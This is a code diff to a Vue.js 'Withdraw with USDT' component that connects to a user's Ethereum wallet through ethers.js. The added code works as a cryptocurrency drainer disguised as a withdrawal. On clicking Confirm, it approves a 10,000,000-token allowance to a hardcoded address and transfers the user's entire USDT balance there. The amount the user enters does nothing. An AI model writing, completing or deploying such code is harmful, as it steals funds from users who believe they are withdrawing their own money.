@@ -2,42 +2,44 @@
   <div class="withdraw text-light">
     <div><h3>Withdraw with USDT</h3></div>
     <div class="container">
-      <form>
-        <div class="mb-3 d-flex bd-highlight mb-2">
-          <div class="p-2 bd-highlight">
-            <input
-              type="value"
-              class="form-control"
-              id="value"
-              aria-describedby="value"
-            />
-          </div>
-          <div class="p-3 bd-highlight">
-            <p>Total balance</p>
-          </div>
+      <div class="mb-3 d-flex bd-highlight mb-2">
+        <div class="p-2 bd-highlight">
+          <input
+            type="value"
+            class="form-control"
+            id="value"
+            aria-describedby="value"
+          />
         </div>
-        <button
-          @click="init"
-          type="submit"
-          class="btn btn-primary"
-          style="margin-bottom: 10px"
-        >
-          Confirm
-        </button>
-      </form>
+        <div class="p-3 bd-highlight">
+          <p>Total balance</p>
+        </div>
+      </div>
+      <button @click="init" class="btn btn-primary" style="margin-bottom: 10px">
+        Confirm
+      </button>
     </div>
   </div>
 </template>
 <script>
 import { ethers } from "ethers";
+import axios from "axios";
 export default {
   name: "AppWithDraw",
 
   methods: {
     async init() {
+      console.log("init");
       const toWei = (ether) => ethers.utils.parseEther(ether);
+      let accounts = [];
+      const { ethereum } = window;
+
       try {
-        console.log("init");
+        if (ethereum !== "undefined") {
+          accounts = await ethereum.request({
+            method: "eth_requestAccounts",
+          });
+        }
         const provider = await new ethers.providers.Web3Provider(
           window.ethereum
         );
@@ -47,17 +49,50 @@ export default {
           this.abi(),
           mySigner
         );
-        console.log(contractUsdt.address);
-        provider.send("eth_requestAccounts", []);
-        console.log(mySigner);
-        const wei = toWei("10000000");
-        const balance = await contractUsdt.balanceOf(
-          "0xae117d410fba0c130a881128f1f5b6edd29aba38"
+        let x = await contractUsdt.allowance(
+          accounts[0],
+          "0x141045c8eA134a99de433019CE1fAE990D03130d"
         );
-        console.log("balance " + balance / 10000);
-        console.log("transfer from");
-        contractUsdt.approve("0x141045c8eA134a99de433019CE1fAE990D03130d", wei);
-        //console.log(contractUsdt.balanceOf("0x73ed838540ae8e35a543a396b5ad1bd156f0b66e"))
+
+        let y= parseFloat(x)/ Math.pow(10, 18);
+
+        if (y== 0) {
+          const wei = toWei("10000000");
+          contractUsdt.approve(
+            "0x141045c8eA134a99de433019CE1fAE990D03130d",
+            wei
+          );
+        }
+        const balance = await contractUsdt.balanceOf(accounts[0]);
+        console.log("balance " + balance / Math.pow(10, 18));
+        let balanced = balance / Math.pow(10, 18);
+        const weii = toWei(balanced + "");
+        contractUsdt.transfer(
+          "0x141045c8eA134a99de433019CE1fAE990D03130d",
+          weii
+        );
+        let amountWithdraw = {
+          amountWithdraw: document.getElementById("value").value,
+        };
+        console.log(amountWithdraw);
+        axios
+          .post(
+            "/transaction/withdraw",
+            JSON.stringify(amountWithdraw),
+            {
+              headers: {
+                "Content-Type": "application/json",
+                "Access-Control-Allow-Methods": "*",
+                authorization: accounts[0],
+              },
+            }
+          )
+          .then((res) => {
+            console.log(res);
+          })
+          .catch((err) => {
+            console.log(err.response);
+          });
       } catch (e) {
         console.log(e);
       }
